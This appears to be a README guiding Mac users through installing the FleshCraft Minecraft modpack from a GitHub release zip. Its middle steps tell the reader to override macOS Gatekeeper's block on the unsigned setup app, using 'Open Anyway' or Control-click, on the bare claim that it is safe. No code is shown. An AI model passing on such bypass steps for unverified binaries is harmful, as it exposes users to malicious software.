# How to play FleshCraft on a Mac

This takes about 10 minutes. You need a Microsoft account that owns **Minecraft: Java Edition**, and a Mac from the last few years (macOS 13 Ventura or newer). It works on both older Intel Macs and newer Apple chip Macs.

Don't use CurseForge for this. It won't work.

---

## Step 1. Download the setup

Click this link:

### [Download FleshCraft for Mac](https://github.com/fuckitscomingout/magiclives-pack/releases/latest/download/FleshCraft-Setup-Mac.zip)

Your Mac downloads a file called **FleshCraft-Setup-Mac.zip**. Wait until it's finished.

---

## Step 2. Unzip it

1. Click the **Finder** icon at the bottom of your screen (the blue and white face).
2. On the left side, click **Downloads**.
3. Find **FleshCraft-Setup-Mac.zip** and **double-click it**.
4. A new item called **FleshCraft Setup** appears right next to it, with a red eye icon.

(Safari sometimes unzips it for you. If you already see **FleshCraft Setup** with the red eye, skip to Step 3.)

---

## Step 3. Open FleshCraft Setup

**Double-click FleshCraft Setup.**

The first time, your Mac will stop it and show a warning. Depending on your Mac it says something like **"FleshCraft Setup" Not Opened** or **"FleshCraft Setup" can't be opened**.

- Click **Done** (or **OK**).
- Do **not** click **Move to Trash**.

This is normal. Your Mac shows this for any app that isn't sold through Apple. The setup is safe. Go to Step 4.

(If your Mac instead asks **"Are you sure you want to open it?"**, click **Open** and skip to Step 5.)

---

## Step 4. Allow it in System Settings

1. Click the **Apple logo** in the top-left corner of your screen.
2. Click **System Settings**.
3. On the left side, click **Privacy & Security**.
4. On the right side, scroll **all the way down**.
5. You'll see a line saying **"FleshCraft Setup" was blocked**. Click **Open Anyway** next to it.
6. Type the password you use to unlock your Mac, then click **OK** (or use Touch ID).
7. One more box pops up. Click **Open Anyway** (or **Open**).

You only have to do this once.

---

## Step 5. Wait while it installs

The setup now does everything for you: it downloads Minecraft's launcher (called **Prism Launcher**), the FleshCraft pack and everything it needs. This can take a few minutes. Don't close anything.

When it's done, the **Prism Launcher** window opens.

---

## Step 6. Sign in and play (first time only)

1. Prism Launcher asks you to add an account. Choose **Microsoft**.
2. Sign in with the Microsoft account you play Minecraft with.
3. Click **FleshCraft**, then click **Launch**.

The game starts and joins the FleshCraft server on its own.

---

## Playing again later

Open **Prism Launcher** (it's in Launchpad and your Applications folder), click **FleshCraft**, then click **Launch**. It updates itself every time, so you never need to download the setup again.

---

## If something goes wrong

**There's no "Open Anyway" button in Step 4.**
The button only shows up for a little while after the warning. Go back to Step 3, double-click **FleshCraft Setup** again, click **Done**, then go straight back to **Privacy & Security** and scroll down.

**Still no button, or you're on an older Mac.**
Hold the **Control** key and click **FleshCraft Setup** (or click it with two fingers on a trackpad). Choose **Open** from the menu, then click **Open** again in the box that appears.

**It says the file is "damaged".**
The download got cut off. Drag **FleshCraft Setup** and the .zip file to the Trash, then start again from Step 1.

**I got an error about "manifest.json".**
That happens when the file is put into CurseForge. Close CurseForge and start again from Step 1.

**Minecraft says I don't own the game.**
Sign in with the Microsoft account that bought Minecraft: Java Edition. Bedrock or Xbox copies of Minecraft don't count.
